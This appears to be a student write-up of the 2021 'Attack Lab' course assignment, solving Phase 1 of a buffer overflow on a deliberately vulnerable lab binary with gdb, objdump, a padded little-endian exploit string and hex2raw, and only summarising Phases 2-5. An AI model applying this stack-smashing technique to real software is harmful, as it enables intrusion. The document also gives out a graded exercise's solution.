# Attack Lab Project (2021)

## Introduction
This project demonstrates buffer overflow exploits using different target files (`ctarget` and `rtarget`). The exercises are divided into five phases. The first three phases use the `ctarget` file, and the last two phases use the `rtarget` file.

Your unique cookie value is provided in the `ID.txt` file. For this project, the cookie value is `0x75d6394e`.

When passing arguments, the first six arguments go to `%rdi`, `%rsi`, `%rdx`, `%rcx`, `%r8`, then `%r9`.

The function `Gets` is similar to the standard library function `gets`. It reads a string from standard input (terminated by ‘\n’ or end-of-file) and stores it (along with a null terminator) at the specified destination. In this code, the destination is an array `buf`, declared with `BUFFER_SIZE` bytes.

## Phase 1
Phase 1 involves calling the function `touch1` by overflowing the stack with an exploit string that changes the return address of the `getbuf` function to the address of `touch1`.

### Steps to Solve Phase 1:
1. Run `ctarget` in `gdb` and set a breakpoint at `getbuf`:
    ```sh
    gdb ctarget
    break getbuf
    ```
2. Disassemble the `getbuf` function:
    ```sh
    disas getbuf
    ```
    You will see the following assembly code:
    ```assembly
    0x0000000000401780 <+0>:    sub    $0x18,%rsp
    0x0000000000401784 <+4>:    mov    %rsp,%rdi
    0x0000000000401787 <+7>:    callq  0x4019ba <Gets>
    0x000000000040178c <+12>:   mov    $0x1,%eax
    0x0000000000401791 <+17>:   add    $0x18,%rsp
    0x0000000000401795 <+21>:   retq
    ```
    There are 24 bytes (`0x18`) of buffer allocated for `getbuf`. This means you need 24 bytes of padding followed by the address of `touch1`.

3. Find the address of `touch1`:
    ```sh
    objdump -d ctarget > ctarget_dump.txt
    ```
    Open the `ctarget_dump.txt` file and search for `touch1`:
    ```sh
    cat ctarget_dump.txt | grep touch1
    ```
    You should see something like:
    ```assembly
    0000000000401796 <touch1>:
    ```

4. Create an exploit string in a text file `phase1.txt`:
    ```sh
    emacs phase1.txt
    ```
    The first 24 bytes will be padding, followed by the little-endian representation of `touch1`'s address:
    ```
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    96 17 40 00 00 00 00 00
    ```

5. Convert the hex string to raw format:
    ```sh
    ./hex2raw < phase1.txt > raw-phase1.txt
    ```

6. Run the exploit:
    ```sh
    ./ctarget < raw-phase1.txt
    ```
    You should see:
    ```plaintext
    Cookie: 0x434b4b70 // Your cookie will be different
    Type string:Touch1!: You called touch1()
    Valid solution for level 1 with target ctarget
    PASS: Sent exploit string to server to be validated.
    NICE JOB!
    ```

## Phases 2-5
Phases 2 and 3 continue with `ctarget` and involve similar buffer overflow techniques but target different functions (`touch2` and `touch3`). Phases 4 and 5 use the `rtarget` file, applying more advanced techniques.

---

For each phase, follow similar steps:
- Disassemble relevant functions.
- Identify buffer sizes and target addresses.
- Craft the exploit string in little-endian format.
- Convert and run the exploit using `hex2raw`.

Happy hacking!

---

**Note:** Always follow ethical guidelines and perform such exercises in controlled, legal environments.
